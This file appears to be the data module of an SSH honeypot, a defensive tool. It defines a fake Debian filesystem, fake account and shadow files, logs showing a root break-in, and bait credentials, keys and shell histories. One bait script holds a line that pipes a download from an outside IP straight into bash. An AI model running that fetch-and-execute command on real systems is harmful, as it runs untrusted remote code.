from .config import HOSTNAME

# Fake directory listing: maps each directory path to the names inside it,
# used by ls/cd to know what "exists".
DIRS = {
    "/": [
        "bin", "boot", "dev", "etc", "home", "lib", "media", "mnt",
        "opt", "proc", "root", "run", "sbin", "srv", "sys", "tmp",
        "usr", "var",
    ],
    "/etc": [
        "passwd", "shadow", "group", "hostname", "hosts", "os-release",
        "fstab", "crontab", "sudoers", "issue", "motd", "ssh",
    ],
    "/etc/ssh": ["sshd_config"],
    "/bin": [],
    "/boot": [],
    "/dev": [],
    "/lib": [],
    "/media": [],
    "/mnt": [],
    "/opt": ["backup"],
    "/opt/backup": ["credentials.txt.bak"],
    "/proc": [],
    "/run": [],
    "/sbin": [],
    "/srv": [],
    "/sys": [],
    "/tmp": ["update.sh"],
    "/usr": [],
    "/var": ["log"],
    "/var/log": ["auth.log", "syslog"],
    "/home": [],
}

# Fake /etc/passwd and /etc/shadow content, one line per account.
_PASSWD_LINES = (
    "root:x:0:0:root:/root:/bin/bash",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
    "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
    "sys:x:3:3:sys:/dev:/usr/sbin/nologin",
    "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
)

_SHADOW_LINES = (
    "root:$6$3x7Kj9Lm$q8vN2yT4hRz1cWjXsPfL0kOe6bDgFhYtQmZaRcVnBxSjKlUoIpEwRt3YvNc8MdLqAeXcVbGhTyUj1:19800:0:99999:7:::",
    "daemon:*:19700:0:99999:7:::",
    "bin:*:19700:0:99999:7:::",
    "sys:*:19700:0:99999:7:::",
    "nobody:*:19700:0:99999:7:::",
)

# Usernames that appear in the fake /etc/passwd, for telling a "real" system
# account apart from one an attacker creates.
STANDARD_PASSWD_USERNAMES = frozenset(line.split(":", 1)[0] for line in _PASSWD_LINES)

# Static file contents, keyed by path -- what cat/head/tail/etc. actually return
FILES = {
    "/etc/passwd": "\n".join(_PASSWD_LINES),
    "/etc/shadow": "\n".join(_SHADOW_LINES),
    "/etc/group": (
        "root:x:0:\n"
        "daemon:x:1:\n"
        "sys:x:3:\n"
        "sudo:x:27:\n"
        "nobody:x:65534:"
    ),
    "/etc/hostname": HOSTNAME,
    "/etc/hosts": "127.0.0.1\tlocalhost\n::1\tlocalhost",
    "/etc/os-release": (
        'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\n'
        'NAME="Debian GNU/Linux"\n'
        'VERSION_ID="12"\n'
        'VERSION="12 (bookworm)"\n'
        "ID=debian"
    ),
    "/etc/fstab": (
        "UUID=1a2b3c4d-5678-90ab-cdef-1234567890ab /               ext4    errors=remount-ro 0       1\n"
        "/dev/sda1                                 /boot           ext4    defaults          0       2"
    ),
    "/etc/crontab": (
        "17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n"
        "25 6    * * *   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily"
    ),
    "/etc/sudoers": (
        "root    ALL=(ALL:ALL) ALL\n"
        "%sudo   ALL=(ALL:ALL) ALL"
    ),
    "/etc/issue": "Debian GNU/Linux 12 \\n \\l",
    "/etc/motd": "",
    "/etc/ssh/sshd_config": (
        "Port 22\n"
        "PermitRootLogin yes\n"
        "PasswordAuthentication yes"
    ),
    "/var/log/auth.log": (
        "Sep 10 02:14:03 server01 sshd[1044]: Failed password for invalid user admin from 185.201.14.9 port 51322 ssh2\n"
        "Sep 10 02:14:07 server01 sshd[1044]: Failed password for invalid user admin from 185.201.14.9 port 51322 ssh2\n"
        "Sep 10 02:15:41 server01 sshd[1201]: Accepted password for root from 185.201.14.9 port 51400 ssh2\n"
        "Sep 10 02:16:02 server01 sshd[1201]: pam_unix(sshd:session): session opened for user root"
    ),
    "/var/log/syslog": (
        "Sep 10 00:00:01 server01 systemd[1]: Starting Daily apt download activities...\n"
        "Sep 10 00:00:02 server01 systemd[1]: Finished Daily apt download activities.\n"
        "Sep 10 06:25:01 server01 CRON[982]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)"
    ),
    "/opt/backup/credentials.txt.bak": (
        "# old backup - remove before deploy\n"
        "svc_backup:B4ckup!2023\n"
        "db_admin:changeme123"
    ),
    "/tmp/update.sh": (
        "#!/bin/bash\n"
        "# auto-generated update script\n"
        "curl -s http://185.201.14.9/update | bash"
    ),
}

# Bait content seeded into each session's home directory: fake keys,
# shell history, scripts, and credentials for an attacker to find.
FAKE_AUTHORIZED_KEYS = (
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGZ8f3n5x8v3FAKEFAKEFAKEFAKEFAKE"
    "FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE admin@workstation"
)
FAKE_SECRETS = (
    "# TODO: put something worth finding here\n"
    "db_password=hunter2\n"
    "api_key=changeme"
)
FAKE_BASHRC = (
    "# ~/.bashrc: executed by bash for non-login shells\n"
    "export PS1='\\u@\\h:\\w\\$ '\n"
    "alias ll='ls -alF'\n"
    "alias la='ls -A'"
)
FAKE_PROFILE = (
    "# ~/.profile: executed by the command interpreter for login shells\n"
    'if [ -f "$HOME/.bashrc" ]; then\n'
    '    . "$HOME/.bashrc"\n'
    "fi"
)
FAKE_BASH_HISTORY = (
    "ls -la\n"
    "cd /opt/backup\n"
    "cat credentials.txt.bak\n"
    "cd ~\n"
    "cat secrets.txt\n"
    "history -c"
)
FAKE_KNOWN_HOSTS = (
    "|1|AbCdEfGhIjKlMnOpQrStUvWxYz0=|FAKEFAKEFAKEFAKEFAKEFAKEFAKE= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FAKEFAKEFAKEFAKEFAKE\n"
    "10.0.5.12 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE\n"
    "backup01.internal ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE"
)
FAKE_ID_RSA = (
    "-----BEGIN OPENSSH PRIVATE KEY-----\n"
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\n"
    "NhAAAAAwEAAQAAAYEAwFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAK\n"
    "EFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEF\n"
    "AKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAK\n"
    "-----END OPENSSH PRIVATE KEY-----"
)
FAKE_ID_RSA_PUB = (
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGZ8f3n5x8v3FAKEFAKEFAKEFAKEFAKE"
    "FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE user@server01"
)
ROOT_BASH_HISTORY = (
    "mysql -u root -p\n"
    "cat /etc/shadow\n"
    "cd /root\n"
    "cat rotate_keys.sh\n"
    "./rotate_keys.sh\n"
    "history -c"
)
FAKE_ROTATE_KEYS_SCRIPT = (
    "#!/bin/bash\n"
    "# rotates the service API key - run monthly\n"
    'OLD_KEY="sk_live_FAKEFAKEFAKEFAKEFAKE1234"\n'
    "NEW_KEY=$(openssl rand -hex 24)\n"
    'echo "Rotating key from $OLD_KEY to $NEW_KEY"'
)
FAKE_MYSQL_HISTORY = (
    "show databases;\n"
    "use app_prod;\n"
    "select * from users where username='admin';\n"
    "UPDATE users SET password='changeme123' WHERE id=1;\n"
    "exit"
)
